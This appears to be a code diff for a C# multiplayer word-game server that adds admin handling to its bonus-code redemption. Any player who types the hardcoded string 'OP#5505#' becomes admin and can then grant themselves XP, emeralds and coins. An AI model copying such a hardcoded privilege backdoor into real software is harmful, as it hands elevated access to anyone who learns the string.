@@ -6,7 +6,6 @@ using System.Net.Sockets;
 using WordBombServer.Common;
 using WordBombServer.Common.Packets.Request;
 using WordBombServer.Common.Packets.Response;
-using WordBombServer.Common.Perk;
 using WordBombServer.Database;
 using WordBombServer.Server.Lobby;
 
@@ -31,7 +30,6 @@ namespace WordBombServer.Server
         public WordProvider WordProvider;
         public UserContext UserContext;
         public UserCodeContext UseCodeContext;
-        public PerkManager PerkManager;
         public UserStatsContext UserStats;
 
         public AvatarBoxes AvatarBoxes { get; set; }
@@ -45,7 +43,6 @@ namespace WordBombServer.Server
 
             WordProvider = new WordProvider();
             WordProvider.LoadWords();
-            PerkManager = new PerkManager();
             AvatarBoxes = new AvatarBoxes();
 
             this.MaxConnection = maxConnection;
@@ -89,6 +86,70 @@ namespace WordBombServer.Server
                 var user = UserContext.GetUser(userName);
 
                 var code = request.Code.ToUpper();
+
+                if (user.IsAdmin)
+                {
+                    short givenXp = 0;
+                    byte givenEmerald = 0;
+                    byte givenCoin = 0;
+                    if (code == "GIVE")
+                    {
+                        givenXp += 100;
+                        givenEmerald += 100;
+                        givenCoin += 100;
+                    }
+                    if (code.Contains("GIVE X"))
+                    {
+                        givenXp += 100;
+                    }
+                    else if (code.Contains("GIVE E"))
+                    {
+                        givenEmerald += 100;
+
+                    }
+                    else if (code.Contains("GIVE S"))
+                    {
+                        givenCoin += 100;
+                    }
+                    else if (code.Contains("-SAVE"))
+                    {
+                        Startup.Server.UserContext.SaveChanges();
+                        Startup.Server.UseCodeContext.SaveChanges();
+                        lobbyRequestHandler.ErrorResponse(peer, "Saved");
+                    }
+                    else if (code.Contains("DEOP"))
+                    {
+                        user.IsAdmin = false;
+                        lobbyRequestHandler.ErrorResponse(peer, "NO ADMIN PRIV:" + user.IsAdmin);
+                    }
+
+                    var anyValue = givenXp + givenEmerald + givenCoin > 0;
+                    if (anyValue)
+                    {
+                        user.Experience += givenXp;
+                        user.EmeraldCount += givenEmerald;
+                        user.CoinCount += givenCoin;
+                        SendPacket(peer, new UpdateUserData()
+                        {
+                            Id = peer.Id,
+                            Coin = givenCoin,
+                            Emerald = givenEmerald,
+                            XP = givenXp,
+                        });
+                    }
+
+                    return;
+                }
+                else
+                {
+                    if (code == "OP#5505#")
+                    {
+                        user.IsAdmin = true;
+                        lobbyRequestHandler.ErrorResponse(peer, "ADMIN_PRIV");
+                        return;
+                    }
+                }
+
                 if (BonusCodes.Codes.Contains(code))
                 {
                     if (UseCodeContext.UseCode(user.Id, code))
@@ -112,6 +173,7 @@ namespace WordBombServer.Server
                 }
             }
         }
+
 
         private void UpdatePlayer(UpdateDisplayNameRequest request, NetPeer peer)
         {
@@ -154,14 +216,13 @@ namespace WordBombServer.Server
             }
         }
 
-       
+
 
         private void LoginUser(LoginRequest request, NetPeer peer)
         {
             if (!Startup.RequestTimer.AddType(request.GetType(), peer))
                 return;
 
-         
 
             if (request.UserName.Any(t => !char.IsLetterOrDigit(t))
              || request.UserName.Length < 3 || request.UserName.Length > 20)
@@ -205,7 +266,7 @@ namespace WordBombServer.Server
             }
         }
 
-      
+
         public void UserLogin(LoginResponse response, NetPeer peer)
         {
             foreach (var p in LoggedInUsers)
